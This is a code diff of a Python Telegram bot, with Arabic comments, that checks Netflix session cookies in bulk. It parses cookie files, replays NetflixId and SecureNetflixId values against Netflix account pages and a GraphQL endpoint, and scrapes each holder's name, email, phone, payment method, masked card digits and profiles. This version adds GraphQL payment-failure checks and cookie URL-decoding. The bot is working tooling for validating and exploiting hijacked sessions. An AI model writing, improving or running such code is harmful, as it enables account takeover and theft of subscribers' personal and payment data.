@@ -1,4 +1,4 @@
-# NF.py - Netflix Cookies Checker Bot (Final Fixed Version)
+# NF.py - Netflix Cookies Checker Bot (Final v3 - GraphQL Payment Detection)
 import os
 import re
 import json
@@ -6,6 +6,7 @@ import zipfile
 import html
 import time
 import asyncio
+import urllib.parse
 from datetime import datetime
 from io import BytesIO
 
@@ -139,127 +140,8 @@ UI_TRANSLATIONS_BLACKLIST = {
     'تسجيل الدخول', 'تسجيل الخروج', 'خروج', 'حسابي', 'الإعدادات',
     'مساعدة', 'الدعم', 'اتصل بنا', 'الملفات الشخصية', 'الملف الشخصي',
     'الاسم', 'تم', 'حفظ', 'إغلاق', 'رجوع', 'التالي', 'السابق',
-    'プロフィールの管理', 'プロフィールを管理', 'プロフィール管理', '管理',
-    'プロフィールを編集', '編集', 'プロフィールを追加', '追加',
-    'プロフィールを作成', '作成', 'プロフィールを削除', '削除',
-    'プロフィールを切り替え', '切り替え', 'すべて表示', 'すべてを見る',
-    'ログイン', 'ログアウト', 'アカウント', '設定', 'ヘルプ', 'サポート',
-    'お問い合わせ', 'プロフィール', '名前', '完了', '保存', '閉じる',
-    '戻る', '次へ', '前へ',
-    '프로필 관리', '관리', '프로필 편집', '편집', '프로필 추가', '추가',
-    '프로필 만들기', '만들기', '프로필 삭제', '삭제', '프로필 전환', '전환',
-    '모두 보기', '전체 보기', '로그인', '로그아웃', '계정', '설정',
-    '도움말', '지원', '문의', '프로필', '이름', '완료', '저장', '닫기',
-    '뒤로', '다음', '이전',
-    '管理個人資料', '管理配置文件', '管理', '編輯個人資料', '編輯', '編輯設定檔',
-    '新增個人資料', '新增', '建立個人資料', '建立', '刪除個人資料', '刪除',
-    '切換個人資料', '切換', '查看全部', '顯示全部', '登入', '登出',
-    '帳戶', '設定', '說明', '支援', '聯絡我們', '個人資料', '名稱',
-    '完成', '儲存', '關閉', '返回', '下一頁', '上一頁',
-    'διαχείριση προφίλ', 'διαχείριση', 'επεξεργασία προφίλ', 'επεξεργασία',
-    'προσθήκη προφίλ', 'προσθήκη', 'δημιουργία προφίλ', 'δημιουργία',
-    'διαγραφή προφίλ', 'διαγραφή', 'εναλλαγή προφίλ', 'εναλλαγή',
-    'προβολή όλων', 'σύνδεση', 'αποσύνδεση', 'λογαριασμός', 'ρυθμίσεις',
-    'βοήθεια', 'υποστήριξη', 'επικοινωνία', 'προφίλ', 'όνομα', 'τέλος',
-    'αποθήκευση', 'κλείσιμο', 'πίσω', 'επόμενο', 'προηγούμενο',
-    'ניהול פרופילים', 'ניהול', 'עריכת פרופיל', 'עריכה', 'הוספת פרופיל', 'הוספה',
-    'יצירת פרופיל', 'יצירה', 'מחיקת פרופיל', 'מחיקה', 'החלפת פרופיל', 'החלפה',
-    'הצג הכל', 'התחברות', 'התנתקות', 'חשבון', 'הגדרות', 'עזרה', 'תמיכה',
-    'צור קשר', 'פרופילים', 'פרופיל', 'שם', 'סיום', 'שמור', 'סגור',
-    'חזור', 'הבא', 'הקודם',
-    'administrare profiluri', 'administrare', 'editează profilul', 'editează',
-    'adaugă profil', 'adaugă', 'creează profil', 'creează', 'șterge profil', 'șterge',
-    'schimbă profilul', 'schimbă', 'vezi tot', 'arată tot', 'conectare', 'deconectare',
-    'cont', 'setări', 'ajutor', 'suport', 'contact', 'profiluri', 'profil', 'nume',
-    'gata', 'salvează', 'închide', 'înapoi', 'următor', 'anterior',
-    'profilok kezelése', 'kezelés', 'profil szerkesztése', 'szerkesztés',
-    'profil hozzáadása', 'hozzáadás', 'profil létrehozása', 'létrehozás',
-    'profil törlése', 'törlés', 'profil váltása', 'váltás', 'összes megtekintése',
-    'bejelentkezés', 'kijelentkezés', 'fiók', 'beállítások', 'súgó', 'támogatás',
-    'kapcsolat', 'profilok', 'profil', 'név', 'kész', 'mentés', 'bezárás',
-    'vissza', 'következő', 'előző',
-    'spravovat profily', 'spravovat', 'upravit profil', 'upravit',
-    'přidat profil', 'přidat', 'vytvořit profil', 'vytvořit', 'smazat profil', 'smazat',
-    'přepnout profil', 'přepnout', 'zobrazit vše', 'přihlásit se', 'odhlásit se',
-    'účet', 'nastavení', 'nápověda', 'podpora', 'kontakt', 'profily', 'profil',
-    'jméno', 'hotovo', 'uložit', 'zavřít', 'zpět', 'další', 'předchozí',
-    'administrer profiler', 'administrer', 'rediger profil', 'rediger',
-    'tilføj profil', 'tilføj', 'opret profil', 'opret', 'slet profil', 'slet',
-    'skift profil', 'skift', 'se alle', 'vis alle', 'log ind', 'log ud',
-    'konto', 'indstillinger', 'hjælp', 'support', 'kontakt', 'profiler',
-    'profil', 'navn', 'færdig', 'gem', 'luk', 'tilbage', 'næste', 'forrige',
-    'hantera profiler', 'hantera', 'redigera profil', 'redigera',
-    'lägg till profil', 'lägg till', 'skapa profil', 'skapa', 'ta bort profil', 'ta bort',
-    'byt profil', 'byt', 'se alla', 'visa alla', 'logga in', 'logga ut',
-    'konto', 'inställningar', 'hjälp', 'support', 'kontakt', 'profiler',
-    'profil', 'namn', 'klar', 'spara', 'stäng', 'tillbaka', 'nästa', 'föregående',
-    'legg til profil', 'legg til', 'opprett profil', 'opprett', 'slett profil', 'slett',
-    'bytt profil', 'bytt', 'se alle', 'vis alle', 'logg inn', 'logg ut',
-    'konto', 'innstillinger', 'hjelp', 'støtte', 'kontakt', 'profiler',
-    'profil', 'navn', 'ferdig', 'lagre', 'lukk', 'tilbake', 'neste', 'forrige',
-    'hallinnoi profiileja', 'hallinnoi', 'muokkaa profiilia', 'muokkaa',
-    'lisää profiili', 'lisää', 'luo profiili', 'luo', 'poista profiili', 'poista',
-    'vaihda profiilia', 'vaihda', 'näytä kaikki', 'kirjaudu sisään', 'kirjaudu ulos',
-    'tili', 'asetukset', 'ohje', 'tuki', 'yhteystiedot', 'profiilit', 'profiili',
-    'nimi', 'valmis', 'tallenna', 'sulje', 'takaisin', 'seuraava', 'edellinen',
-    'kelola profil', 'kelola', 'edit profil', 'edit', 'tambah profil', 'tambah',
-    'buat profil', 'buat', 'hapus profil', 'hapus', 'ganti profil', 'ganti',
-    'lihat semua', 'masuk', 'keluar', 'akun', 'pengaturan', 'bantuan', 'dukungan',
-    'kontak', 'profil', 'nama', 'selesai', 'simpan', 'tutup', 'kembali',
-    'berikutnya', 'sebelumnya',
-    'urus profil', 'urus', 'sunting profil', 'sunting', 'tambah profil', 'tambah',
-    'cipta profil', 'cipta', 'padam profil', 'padam', 'tukar profil', 'tukar',
-    'lihat semua', 'log masuk', 'log keluar', 'akaun', 'tetapan', 'bantuan',
-    'sokongan', 'hubungi', 'profil', 'nama', 'siap', 'simpan', 'tutup',
-    'kembali', 'seterusnya', 'sebelumnya',
-    'quản lý hồ sơ', 'quản lý', 'chỉnh sửa hồ sơ', 'chỉnh sửa',
-    'thêm hồ sơ', 'thêm', 'tạo hồ sơ', 'tạo', 'xóa hồ sơ', 'xóa',
-    'chuyển hồ sơ', 'chuyển', 'xem tất cả', 'đăng nhập', 'đăng xuất',
-    'tài khoản', 'cài đặt', 'trợ giúp', 'hỗ trợ', 'liên hệ', 'hồ sơ',
-    'tên', 'xong', 'lưu', 'đóng', 'quay lại', 'tiếp theo', 'trước',
-    'จัดการโปรไฟล์', 'จัดการ', 'แก้ไขโปรไฟล์', 'แก้ไข', 'เพิ่มโปรไฟล์', 'เพิ่ม',
-    'สร้างโปรไฟล์', 'สร้าง', 'ลบโปรไฟล์', 'ลบ', 'สลับโปรไฟล์', 'สลับ',
-    'ดูทั้งหมด', 'เข้าสู่ระบบ', 'ออกจากระบบ', 'บัญชี', 'การตั้งค่า',
-    'ช่วยเหลือ', 'สนับสนุน', 'ติดต่อ', 'โปรไฟล์', 'ชื่อ', 'เสร็จสิ้น',
-    'บันทึก', 'ปิด', 'กลับ', 'ถัดไป', 'ก่อนหน้า',
-    'pamahalaan ang mga profile', 'pamahalaan', 'i-edit ang profile', 'i-edit',
-    'magdagdag ng profile', 'magdagdag', 'gumawa ng profile', 'gumawa',
-    'burahin ang profile', 'burahin', 'palitan ang profile', 'palitan',
-    'tingnan lahat', 'mag-sign in', 'mag-sign out', 'account', 'mga setting',
-    'tulong', 'suporta', 'contact', 'mga profile', 'profile', 'pangalan',
-    'tapos na', 'i-save', 'isara', 'bumalik', 'susunod', 'nakaraan',
+    'administrar perfiles', 'gestionar perfiles',
 }
-
-# ✅ علامات payment failure واضحة (بس الصيغ اللي Netflix فعلاً بيستخدمها)
-PAYMENT_FAILED_SIGNS = [
-    'update your payment information to continue',
-    'we were unable to process your last payment',
-    'unable to process your last payment',
-    'please update your payment information',
-    'update payment method',
-    'there was a problem with your payment',
-    'your payment was declined',
-    'problem with your last payment',
-    'payment failed',
-    'payment declined',
-    'your account is on hold',
-    'account is on hold',
-    'billing issue',
-    'fix payment issue',
-    'update billing',
-    'تحديث معلومات الدفع',
-    'تعذر معالجة الدفعة',
-    'فشل الدفع',
-    'تم رفض الدفع',
-    'حسابك معلق',
-    'يرجى تحديث معلومات الدفع',
-    'actualiza tu información de pago',
-    'no pudimos procesar tu último pago',
-    'mettez à jour vos informations de paiement',
-    'atualize suas informações de pagamento',
-    'aktualisieren sie ihre zahlungsinformationen',
-    'aggiorna le tue informazioni di pagamento',
-]
 
 # ======================== دوال NFToken ========================
 async def create_nftoken_link(netflix_id):
@@ -357,6 +239,18 @@ def decode_value(value):
     cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
     cleaned = re.sub(r"\s+", " ", cleaned).strip()
     return cleaned or None
+
+def decode_cookie_value(value):
+    """فك URL encoding من قيمة الكوكي"""
+    if not value:
+        return value
+    try:
+        # لو فيه % نعمل decode
+        if '%' in value:
+            return urllib.parse.unquote(value)
+        return value
+    except:
+        return value
 
 def country_to_flag(code):
     if not code:
@@ -473,16 +367,14 @@ def format_membership_status(status):
     else:
         return status.title()
 
-# ✅ كشف صفحة تسجيل الدخول بشكل دقيق
+# ✅ كشف صفحة تسجيل الدخول
 def is_login_page(html_content):
-    """بيكتشف لو الصفحة دي صفحة تسجيل دخول"""
     if not html_content:
         return True
     
     html_lower = html_content.lower()
     first_chunk = html_lower[:5000]
     
-    # ✅ علامات إيجابية إن دي صفحة YourAccount حقيقية
     has_account_signs = (
         'your account' in first_chunk or
         'account details' in first_chunk or
@@ -498,7 +390,6 @@ def is_login_page(html_content):
     if has_account_signs:
         return False
     
-    # ✅ لو مفيش أي علامة على الحساب، نشوف لو فيها علامات login قوية
     has_login_signs = (
         'netflix - sign in' in html_lower[:500] or
         'signin-form' in html_lower or
@@ -512,17 +403,81 @@ def is_login_page(html_content):
     
     return False
 
-# ✅ كشف payment failed
-def check_payment_failed(html_content):
-    """بيدور على علامات payment failed في الصفحة"""
+# ✅ كشف payment failed من HTML
+def check_payment_failed_html(html_content):
     if not html_content:
         return False
     
     html_lower = html_content.lower()
     
-    for sign in PAYMENT_FAILED_SIGNS:
-        if sign.lower() in html_lower:
+    signs = [
+        'update your payment information to continue',
+        'we were unable to process your last payment',
+        'unable to process your last payment',
+        'please update your payment information',
+        'clcsPaymentFailureBannerView'.lower(),
+        'payment_failure_interstitial',
+        'payment_failure',
+        'update payment method',
+    ]
+    
+    for sign in signs:
+        if sign in html_lower:
             return True
+    
+    return False
+
+# ✅ كشف payment failed عبر GraphQL - الطريقة الجديدة والأقوى
+async def check_payment_via_graphql(session):
+    """بيفحص payment status عبر GraphQL - الطريقة اللي Netflix بيستخدمها فعلاً"""
+    graphql_url = "https://www.netflix.com/graphql"
+    
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": "https://www.netflix.com",
+        "referer": "https://www.netflix.com/account",
+        "x-netflix.context.operation-name": "CLCSInterstitialAccountPages",
+        "x-netflix.request.originating.url": "https://www.netflix.com/account",
+        "x-netflix.request.attempt": "1",
+    }
+    
+    body = {
+        "operationName": "CLCSInterstitialAccountPages",
+        "variables": {
+            "format": "HTML",
+            "resolutionMode": "WEB_1X",
+            "accountSubpage": "/account"
+        },
+        "extensions": {
+            "persistedQuery": {
+                "id": "03b4bbd1-8fa5-4528-bcee-7d539f207dde",
+                "version": 102
+            }
+        }
+    }
+    
+    try:
+        async with session.post(graphql_url, json=body, headers=headers) as resp:
+            if resp.status == 200:
+                response_text = await resp.text()
+                
+                # ✅ علامات payment failed
+                if "clcsPaymentFailureBannerView" in response_text:
+                    return True
+                if "payment_failure_interstitial" in response_text:
+                    return True
+                if "PAYMENT_FAILURE_INTERSTITIAL" in response_text:
+                    return True
+                if "Update your payment information to continue" in response_text:
+                    return True
+                if "unable to process your last payment" in response_text:
+                    return True
+                if "payment_failure" in response_text.lower():
+                    return True
+    except Exception as e:
+        print(f"[GraphQL Error] {e}")
     
     return False
 
@@ -539,6 +494,9 @@ def extract_all_cookies_from_file(content):
     for match in all_matches:
         cookies = {}
         nf_value = match.group(1).strip('"')
+        
+        # ✅ فك URL encoding
+        nf_value = decode_cookie_value(nf_value)
 
         if any(acc['cookies'].get('NetflixId') == nf_value for acc in accounts):
             continue
@@ -552,7 +510,9 @@ def extract_all_cookies_from_file(content):
         snf_pattern = r'SecureNetflixId[=\t\s]+([^\s\n\t;]+)'
         snf_match = re.search(snf_pattern, nearby_text)
         if snf_match:
-            cookies['SecureNetflixId'] = snf_match.group(1).strip('"')
+            snf_value = snf_match.group(1).strip('"')
+            snf_value = decode_cookie_value(snf_value)
+            cookies['SecureNetflixId'] = snf_value
 
         accounts.append({"cookies": cookies, "raw": f"account_{len(accounts)+1}"})
 
@@ -569,6 +529,7 @@ def extract_all_cookies_from_file(content):
             if len(parts) >= 7:
                 name = parts[5]
                 value = parts[6]
+                value = decode_cookie_value(value)
 
                 if name == 'NetflixId':
                     netscape_cookies['NetflixId'] = value
@@ -589,11 +550,11 @@ def extract_all_cookies_from_file(content):
 
             nf_match = re.search(r'NetflixId[=\t]+([^\s\n\t;]+)', part)
             if nf_match:
-                cookies["NetflixId"] = nf_match.group(1).strip('"')
+                cookies["NetflixId"] = decode_cookie_value(nf_match.group(1).strip('"'))
 
             snf_match = re.search(r'SecureNetflixId[=\t]+([^\s\n\t;]+)', part)
             if snf_match:
-                cookies["SecureNetflixId"] = snf_match.group(1).strip('"')
+                cookies["SecureNetflixId"] = decode_cookie_value(snf_match.group(1).strip('"'))
 
             if cookies.get("NetflixId"):
                 if not any(acc['cookies'].get('NetflixId') == cookies['NetflixId'] for acc in accounts):
@@ -605,7 +566,6 @@ def extract_all_cookies_from_file(content):
 def extract_payment_method(html_content):
     payment_methods = []
 
-    # ✅ أولاً: البحث عن masked card
     masked_card_match = re.search(r'[*•]{2,}\s*(\d{4})\b', html_content)
     if masked_card_match:
         return f"Card ending in {masked_card_match.group(1)}"
@@ -644,22 +604,8 @@ def extract_payment_method(html_content):
                         method = f"Card ending in {card_match.group(1)}"
                 payment_methods.append(method[:50])
 
-    js_patterns = [
-        r'paymentMethodDisplayName["\']?\s*:\s*["\']([^"\']+)',
-        r'payment_info["\']?\s*:\s*{[^}]*method["\']?\s*:\s*["\']([^"\']+)',
-        r'currentPaymentMethod["\']?\s*:\s*["\']([^"\']+)',
-    ]
-
-    for pattern in js_patterns:
-        match = re.search(pattern, html_content, re.IGNORECASE)
-        if match:
-            method = decode_value(match.group(1))
-            if method and method not in payment_methods and len(method) < 100:
-                payment_methods.append(method)
-
     known_methods = ['PayPal', 'Visa', 'Mastercard', 'American Express', 'Amex', 'Discover',
-                     'Gift Card', 'iTunes', 'Google Play', 'Bank Transfer', 'OVO',
-                     'Sofort', 'IDEAL', 'Giropay']
+                     'Gift Card', 'iTunes', 'Google Play', 'Bank Transfer', 'OVO']
 
     for method in known_methods:
         if re.search(r'\b' + re.escape(method) + r'\b', html_content, re.IGNORECASE):
@@ -788,7 +734,6 @@ def is_valid_profile_name(name):
     return True
 
 async def extract_profiles_from_page(session, url):
-    """استخراج البروفايلات من صفحة معينة"""
     page_profiles = []
     html_content = ""
     
@@ -798,11 +743,9 @@ async def extract_profiles_from_page(session, url):
                 return page_profiles, ""
             html_content = await resp.text()
 
-        # ✅ لو صفحة login نتجاهلها
         if is_login_page(html_content):
             return page_profiles, html_content
 
-        # الطريقة 1: JSON "profiles" array
         profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
         if profiles_match:
             profiles_data = profiles_match.group(1)
@@ -813,14 +756,12 @@ async def extract_profiles_from_page(session, url):
                     if is_valid_profile_name(decoded) and decoded not in page_profiles:
                         page_profiles.append(decoded)
 
-        # الطريقة 2: "profileName"
         profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
         for match in profile_matches:
             pname = clean_profile_name(match.group(1))
             if is_valid_profile_name(pname) and pname not in page_profiles:
                 page_profiles.append(pname)
 
-        # الطريقة 3: profiles array + name
         if not page_profiles:
             alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
             for match in alt_matches:
@@ -828,7 +769,6 @@ async def extract_profiles_from_page(session, url):
                 if is_valid_profile_name(pname) and pname not in page_profiles:
                     page_profiles.append(pname)
 
-        # الطريقة 4: class profile-name
         profile_classes = [
             r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
             r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
@@ -850,7 +790,6 @@ async def extract_profiles_from_page(session, url):
                 if is_valid_profile_name(pname) and pname not in page_profiles:
                     page_profiles.append(pname)
 
-        # الطريقة 5: profileId + name
         if not page_profiles:
             alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
             matches = re.finditer(alt_pattern, html_content)
@@ -859,7 +798,6 @@ async def extract_profiles_from_page(session, url):
                 if is_valid_profile_name(pname) and pname not in page_profiles:
                     page_profiles.append(pname)
 
-        # الطريقة 6: profileGuid + name
         if not page_profiles:
             alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
             matches = re.finditer(alt_pattern2, html_content)
@@ -868,16 +806,6 @@ async def extract_profiles_from_page(session, url):
                 if is_valid_profile_name(pname) and pname not in page_profiles:
                     page_profiles.append(pname)
 
-        # الطريقة 7: alt + data-uia
-        if not page_profiles:
-            alt_pattern4 = r'alt="([^"]+)"[^>]*data-uia="profile'
-            matches = re.finditer(alt_pattern4, html_content)
-            for match in matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        # الطريقة 8: __NEXT_DATA__ (بحد أقصى للحجم)
         if not page_profiles:
             next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.{0,500000}?)</script>', html_content, re.DOTALL)
             if next_data_match:
@@ -891,7 +819,6 @@ async def extract_profiles_from_page(session, url):
                 except:
                     pass
 
-        # الطريقة 9: netflix.react.context (بحد أقصى للحجم)
         if not page_profiles:
             react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.{0,500000}?\});', html_content, re.DOTALL)
             if react_match:
@@ -937,22 +864,25 @@ async def get_account_info(cookies):
             cookies=session_cookies,
             headers=headers
         ) as session:
-            # ============ 1. الصفحة الرئيسية YourAccount ============
-            async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp:
+            # ============ 1. صفحة /account (بدل YourAccount) ============
+            async with session.get("https://www.netflix.com/account", allow_redirects=True) as resp:
                 if resp.status != 200:
-                    return None, f"HTTP {resp.status}"
-                html_content = await resp.text()
+                    # نجرب YourAccount كـ fallback
+                    async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp2:
+                        if resp2.status != 200:
+                            return None, f"HTTP {resp2.status}"
+                        html_content = await resp2.text()
+                else:
+                    html_content = await resp.text()
 
-                # ✅ check دقيق لصفحة login
                 if is_login_page(html_content):
                     return None, "Not logged in - cookie expired"
 
                 info = {}
 
-                # ✅ payment_failed flag
-                payment_failed = check_payment_failed(html_content)
+                # payment_failed من HTML
+                payment_failed = check_payment_failed_html(html_content)
 
-                # استخراج البيانات
                 name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
                 if name_match:
                     info["name"] = decode_value(name_match.group(1))
@@ -1000,10 +930,6 @@ async def get_account_info(cookies):
                 payment_method = extract_payment_method(html_content)
                 if payment_method:
                     info["payment"] = payment_method
-                else:
-                    payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
-                    if payment_match:
-                        info["payment"] = decode_value(payment_match.group(1))
 
                 phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
                 if phone_match:
@@ -1043,35 +969,29 @@ async def get_account_info(cookies):
                 else:
                     info["status"] = "Active"
 
-            # ============ 2. صفحة البروفايلات ============
+            # ============ 2. GraphQL check (الطريقة الأقوى) ============
+            graphql_payment_failed = await check_payment_via_graphql(session)
+            if graphql_payment_failed:
+                payment_failed = True
+
+            # ============ 3. صفحة البروفايلات ============
             profiles, profiles_html = await extract_profiles_from_page(session, "https://www.netflix.com/ManageProfiles")
             
             if not profiles:
                 profiles, profiles_html2 = await extract_profiles_from_page(session, "https://www.netflix.com/account/profiles")
-                if profiles_html2 and check_payment_failed(profiles_html2):
+                if profiles_html2 and check_payment_failed_html(profiles_html2):
                     payment_failed = True
             else:
-                if profiles_html and check_payment_failed(profiles_html):
+                if profiles_html and check_payment_failed_html(profiles_html):
                     payment_failed = True
 
-            # ============ 3. صفحة الدفع ============
-            if not payment_failed:
-                try:
-                    async with session.get("https://www.netflix.com/YourAccount/payment", allow_redirects=True) as pay_resp:
-                        if pay_resp.status == 200:
-                            pay_html = await pay_resp.text()
-                            if check_payment_failed(pay_html):
-                                payment_failed = True
-                except:
-                    pass
-
-            # ============ 4. صفحة العضوية ============
+            # ============ 4. صفحة العضوية (fallback) ============
             if not payment_failed:
                 try:
                     async with session.get("https://www.netflix.com/account/membership", allow_redirects=True) as mem_resp:
                         if mem_resp.status == 200:
                             mem_html = await mem_resp.text()
-                            if check_payment_failed(mem_html):
+                            if check_payment_failed_html(mem_html):
                                 payment_failed = True
                 except:
                     pass
@@ -1082,7 +1002,6 @@ async def get_account_info(cookies):
             elif info.get("hold") == "Yes":
                 info["status"] = "Hold"
 
-            # البروفايلات
             if profiles:
                 info["profiles"] = profiles
                 info["profiles_count"] = len(profiles)
@@ -1110,18 +1029,14 @@ def determine_plan(info):
 
     is_subscribed = False
 
-    # ✅ 1. status active أو hold
     if "active" in status or "current_member" in status:
         is_subscribed = True
     elif "hold" in status:
         is_subscribed = True
-    # ✅ 2. plan name
     elif "premium" in plan_name or "standard" in plan_name or "basic" in plan_name or "mobile" in plan_name:
         is_subscribed = True
-    # ✅ 3. streams > 0
     elif streams and streams.isdigit() and int(streams) > 0:
         is_subscribed = True
-    # ✅ 4. دلائل على حساب مدفوع (fallback)
     elif info.get("email") and info.get("name"):
         is_subscribed = True
     elif info.get("phone"):
@@ -1388,7 +1303,6 @@ async def update_progress(context):
     expired_count = sum(1 for r in results.values() if r.get("account_status") == "Expired")
     cancelled_count = sum(1 for r in results.values() if r.get("account_status") == "Cancelled")
     hold_count = sum(1 for r in results.values() if r.get("account_status") in ["On Hold", "Hold"])
-    past_due_count = sum(1 for r in results.values() if r.get("account_status") == "Past Due")
 
     text = (
         f"🔄 Processing Started\n\n"
@@ -1406,8 +1320,7 @@ async def update_progress(context):
         f"   ├─ 🟢 Active: {active_count}\n"
         f"   ├─ 🔴 Expired: {expired_count}\n"
         f"   ├─ 🟠 Cancelled: {cancelled_count}\n"
-        f"   ├─ 🟡 Hold: {hold_count}\n"
-        f"   └─ 🔴 Past Due: {past_due_count}\n\n"
+        f"   └─ 🟡 Hold: {hold_count}\n\n"
         f"{bar} {percent}%\n\n"
         f"⚠️ Use /cancel to stop this task"
     )
@@ -1871,13 +1784,11 @@ def main():
 
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
-    print("✅ Async mode - /cancel responds INSTANTLY")
+    print("✅ GraphQL Payment Detection ACTIVE")
+    print("✅ URL-decoding for cookies")
+    print("✅ Async mode - /cancel INSTANT")
     print("✅ Profile extraction (15 methods)")
-    print("✅ Language & UI filter active")
-    print("✅ HTML entities decoded")
-    print("✅ Payment detection across 4 pages")
-    print("✅ Fixed: 'signin' false positive bug")
-    print("✅ Fixed: determine_plan fallback for valid accounts")
+    print("✅ Language & UI filter")
     print("=" * 50)
 
     app.run_polling(allowed_updates=Update.ALL_TYPES)
